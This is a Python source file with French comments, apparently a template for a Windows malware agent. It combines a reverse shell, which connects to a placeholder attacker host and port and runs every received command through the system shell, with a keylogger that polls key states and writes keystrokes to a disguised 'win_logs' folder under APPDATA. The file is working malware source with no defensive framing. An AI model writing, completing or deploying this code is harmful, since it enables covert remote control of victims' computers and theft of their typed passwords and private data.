import socket
import subprocess
import threading
import os
import sys
import logging
import ctypes
import time

# 📁 Chemins des logs
LOG_DIR = os.path.join(os.getenv("APPDATA") or "C:\\Users\\Public", "win_logs")
KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
os.makedirs(LOG_DIR, exist_ok=True)

# 📋 Logger local (debug)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "agent_debug.log"),
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# 🕳️ Fonction reverse shell (placeholders dynamiques)
def reverse_shell(host=LHOST_PLACEHOLDER, port=LPORT_PLACEHOLDER):
    try:
        logging.info(f"Tentative de connexion a {host}:{port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send("[+] Agent connecte depuis Windows\n".encode())
        logging.info("Connexion reverse shell etablie")

        while True:
            command = s.recv(1024).decode("utf-8")
            if not command:
                break
            if command.lower() in ["exit", "quit"]:
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            s.send(output)
        s.close()
    except Exception as e:
        logging.error(f"Erreur reverse_shell: {e}")

# ⌨️ Fonction keylogger sans dépendance externe
def start_keylogger():
    def run():
        logging.info("Keylogger demarre (mode autonome)")
        while True:
            try:
                for key_code in range(8, 190):
                    if ctypes.windll.user32.GetAsyncKeyState(key_code) & 0x8000:
                        try:
                            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                                f.write(chr(key_code))
                        except:
                            pass
                time.sleep(0.05)
            except Exception as e:
                logging.error(f"Erreur keylogger: {e}")

    t = threading.Thread(target=run, daemon=True)
    t.start()

# 🚀 Point d’entrée
if __name__ == "__main__":
    threading.Thread(target=start_keylogger, daemon=True).start()
    reverse_shell()
